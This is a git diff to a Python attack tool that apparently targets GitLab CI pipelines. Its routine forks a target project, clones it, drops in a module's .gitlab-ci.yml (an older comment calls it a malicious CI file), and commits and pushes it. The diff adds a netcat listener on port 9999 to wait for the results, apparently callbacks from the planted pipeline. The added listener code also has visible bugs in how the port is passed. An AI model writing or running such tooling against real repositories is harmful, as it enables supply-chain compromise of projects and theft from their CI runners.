@@ -4,6 +4,7 @@ import gitlab
 import imp
 import os
 import git
+import thread
 from shutil import copyfile
 from git import Repo
 
@@ -84,21 +85,21 @@ class ModuleMenu(Cmd):
             projectId = project.get_id()
             # Attempt to fork, if forked, stop
             try:
-                print("Forking.......")
+                print("[+] Forking.......")
                 self.forked = project.forks.create(projectId)
             except Exception:
-                print(target + " already forked")
+                print("[!] " + target + " already forked")
                 self.forked = self.server.projects.get(main.GITLAB_USERNAME + "/" + splittarget[1])
 
             # TODO download fork project :http_url_to_repo': 'http://gitlab.example.com/test/ci-test.git
             url = self.forked.__dict__.get('_attrs')['http_url_to_repo']
+            print("RUL:", url)
 
             try:
-                print("Cloning....")
+                print("[+] Cloning......")
                 git.Git(self.installPath + "/repo/").clone(url)
             except Exception:
-                print("Already cloned")
-            # TODO copy malicious ci file
+                print("[!] Already cloned")
             # copyfile(src, dst)
             copyfile( self.installPath + "/modules/"+self.moduleName + "/.gitlab-ci.yml", self.installPath + "/repo/" + splittarget[1] + "/.gitlab-ci.yml")
             # TODO pull request
@@ -109,5 +110,15 @@ class ModuleMenu(Cmd):
             repo.git.commit('-m', "Update gitlab-ci.yml")
             repo.git.push('origin', 'master')
 
+            # Create a listerner
+            print("[!] Waiting for results...")
+            # Start local listerner
+            # TODO: Give users the option to change port
+            thread.start_new_thread(self.startListerner, (9999))
+
     def githubAttack(self):
         print("afa")
+
+    def startListerner(self, port):
+        # Find a better way for listerner
+        os.system("nc -lv " + port)
